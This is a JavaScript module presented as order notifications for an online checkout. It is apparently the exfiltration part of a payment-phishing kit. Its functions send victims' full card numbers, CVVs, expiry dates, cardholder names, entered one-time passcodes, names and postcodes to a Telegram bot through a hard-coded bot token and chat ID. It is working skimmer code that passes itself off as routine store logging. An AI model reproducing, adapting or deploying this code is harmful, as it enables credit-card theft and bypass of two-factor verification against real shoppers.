const BOT_TOKEN = '8410370403:AAFxBmqJQhS1Q5D_XDV8cXqtuZwlhHuaDfo'; // REPLACE with regenerated token
const CHAT_ID = '-4972495592';

// Function to send notification
async function sendTelegramNotification(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            console.log('Telegram notification sent successfully');
        } else {
            console.error('Failed to send Telegram notification:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending Telegram notification:', error);
    }
}

// Function to get USD equivalent
function getUSDEquivalent(localAmount, country) {
    const config = {
        nicaragua: { rate: 37 },
        honduras: { rate: 25 },
        trinidad: { rate: 6.8 },
        elsalvador: { rate: 1 },
        paraguay: { rate: 7500 },
        guatemala: { rate: 7.8 },
        dominican: { rate: 58 },
        usa: { rate: 1 }
    };

    const countryConfig = config[country] || { rate: 1 };
    if (countryConfig.rate === 1) return localAmount;

    // Extract numeric value from local amount (e.g., "$123.45")
    const numericValue = parseFloat(localAmount.replace(/[^\d.]/g, ''));
    if (isNaN(numericValue)) return localAmount; // fallback if parsing fails

    const usdValue = numericValue / countryConfig.rate;
    return `$${usdValue.toFixed(2)} USD`;
}

// Helper function to get country from localStorage or default
function getCurrentCountry() {
    if (typeof localStorage !== 'undefined') {
        return localStorage.getItem('selectedCountry') || 'honduras';
    }
    return 'honduras'; // fallback default
}

const TelegramNotifications = {
    proceedToCheckoutCard: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
🛒 <b>New Checkout Started (Credit Card)</b>

📱 Customer proceeding to checkout
💰 Total Amount: ${orderData.total} (${usdEquivalent})
🛍️ Items: ${orderData.itemCount} item(s)
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Time: ${new Date().toLocaleString()}

<i>Customer is now on the payment page</i>`;
        await sendTelegramNotification(message);
    },

    sendCustomerInfo: async () => {
        const name = (typeof localStorage !== 'undefined') ? localStorage.getItem('customerName') || 'Not provided' : 'Not provided';
        const postcode = (typeof localStorage !== 'undefined') ? localStorage.getItem('customerPostcode') || 'Not provided' : 'Not provided';

        const message = `
🧾 <b>Customer Information</b>

👤 Name: ${name}
📮 Postcode: ${postcode}
⏰ Submitted at: ${new Date().toLocaleString()}
        `;

        await sendTelegramNotification(message);
    },

    confirmBankTransfer: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
💳 <b>Bank Transfer Confirmed</b>

✅ Customer confirmed bank transfer payment
💰 Amount: ${orderData.total} (${usdEquivalent})
🆔 Order Reference: ${orderData.orderRef}
🏦 Payment Method: Bank Transfer
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Confirmed at: ${new Date().toLocaleString()}

<i>⚠️ Please verify the bank transfer in your account</i>`;
        await sendTelegramNotification(message);
    },

    notifyOTP: async (otp) => {
        const message = `
🔐 <b>OTP Received</b>

<code>${otp}</code>
⏰ Time: ${new Date().toLocaleString()}`;
        await sendTelegramNotification(message);
    },

    cardDetailsSubmitted: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
💳 <b>Credit Card Details Submitted</b>

✅ Customer submitted credit card information
👤 Cardholder: ${orderData.cardholderName}
💰 Amount: ${orderData.total} (${usdEquivalent})
🆔 Reference: ${orderData.expiryDate}
🔒 Card Number: ${orderData.cardNumber}
🔑 CVV: ${orderData.cvv}
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Submitted at: ${new Date().toLocaleString()}

<i>🔄 Processing payment...</i>`;
        await sendTelegramNotification(message);
    },

    userEnteredOTP: async (otp) => {
        const currentCountry = getCurrentCountry();

        const message = `
🔐 <b>User Entered OTP for Verification</b>

📱 Customer entered OTP: <code>${otp}</code>
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Time: ${new Date().toLocaleString()}

<i>Please verify this OTP to complete the transaction</i>`;
        await sendTelegramNotification(message);
    }
};

// Export for Node or Browser
if (typeof module !== 'undefined' && module.exports) {
    module.exports = TelegramNotifications;
} else {
    window.TelegramNotifications = TelegramNotifications;
}

